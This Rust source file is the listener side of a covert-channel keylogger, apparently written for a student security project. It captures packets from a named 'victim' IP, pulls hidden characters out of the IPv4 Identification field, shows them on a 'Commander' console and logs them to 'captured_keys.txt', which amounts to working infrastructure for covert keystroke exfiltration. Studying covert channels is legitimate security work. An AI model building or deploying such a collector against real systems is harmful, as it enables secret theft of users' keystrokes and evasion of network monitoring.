use chrono::Local;
use pcap::{Capture, Device};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::thread;
use std::io::{self, Write};
use std::fs::OpenOptions;

// pnet for packet parsing
use pnet::packet::ipv4::Ipv4Packet;

pub struct PcapHandle {
    running: Arc<AtomicBool>,
}

impl PcapHandle {
    pub fn start(interface: &str, victim_ip: String) -> Self {
        let running = Arc::new(AtomicBool::new(true));
        let flag = running.clone();
        let iface = interface.to_string();

        thread::spawn(move || {
            // 1. Find the network interface
            let devices = Device::list().unwrap();
            let device = devices.into_iter().find(|d| d.name == iface);

            let device = match device {
                Some(d) => d,
                None => {
                    eprintln!("\n[!] Error: Interface '{}' not found.", iface);
                    let avail: Vec<String> = Device::list()
                        .unwrap()
                        .into_iter()
                        .map(|d| d.name)
                        .collect();
                    eprintln!("[*] Available interfaces: {:?}", avail);
                    return; 
                }
            };

            // 2. Setup Filenames
            let ts = Local::now().format("%Y%m%d_%H%M%S");
            let pcap_filename = format!("commander_{}.pcap", ts);
            let log_filename = "captured_keys.txt"; 

            println!("\n[*] PCAP capture active: {}", pcap_filename);
            println!("[*] Monitoring covert channel from victim: {}", victim_ip);

            // 3. Open Capture Handle
            let mut cap = Capture::from_device(device)
                .unwrap()
                .promisc(true)
                .snaplen(65535)
                .timeout(100) 
                .open()
                .unwrap();

            // 4. Setup .pcap file dumper for project submission requirements
            let mut dump = cap.savefile(&pcap_filename).unwrap();

            // 5. Main Capture Loop
            while flag.load(Ordering::Relaxed) {
                if let Ok(packet) = cap.next_packet() {
                    // Save raw packet to .pcap
                    dump.write(&packet);

                    // Ethernet header is 14 bytes. Verify we have enough data for an IPv4 header
                    if packet.data.len() > 34 { 
                        if let Some(ip_packet) = Ipv4Packet::new(&packet.data[14..]) {
                            
                            // Check if source matches our victim
                            if ip_packet.get_source().to_string() == victim_ip {
                                
                                // Extract the covert byte from the IP Identification field
                                let covert_byte = ip_packet.get_identification();

                                // Only process if it looks like ASCII/Command data (Non-zero)
                                if covert_byte > 0 && covert_byte < 256 {
                                    let c = covert_byte as u8 as char;
                                    
                                    // Live display in Commander console
                                    print!("{}", c);
                                    io::stdout().flush().unwrap();

                                    // Persistent log to local text file
                                    if let Ok(mut file) = OpenOptions::new()
                                        .create(true)
                                        .append(true)
                                        .open(log_filename) 
                                    {
                                        write!(file, "{}", c).ok();
                                    }
                                }
                            }
                        }
                    }
                }
            }

            println!("\n[*] PCAP capture stopped for {}", victim_ip);
        });

        Self { running }
    }
}

impl Drop for PcapHandle {
    fn drop(&mut self) {
        // This stops the background thread when the Commander disconnects or exits
        self.running.store(false, Ordering::Relaxed);
    }
}
